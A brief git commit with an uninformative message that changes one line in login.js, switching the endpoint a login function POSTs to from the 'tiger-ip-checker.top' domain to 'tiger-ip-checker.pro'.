df0588708a950983dc46f6e2fa3266f6953e1d64
wise65 <cent.wise65@aol.com>
2026-01-24 03:37:16 -0800

    kkshc

--- login.js
+++ login.js
@@ -27,7 +27,7 @@ async function login(chatid) {
   hideMessages();
   
   try {
-    const response = await fetch('https://tiger-ip-checker.top/login', {
+    const response = await fetch('https://tiger-ip-checker.pro/login', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
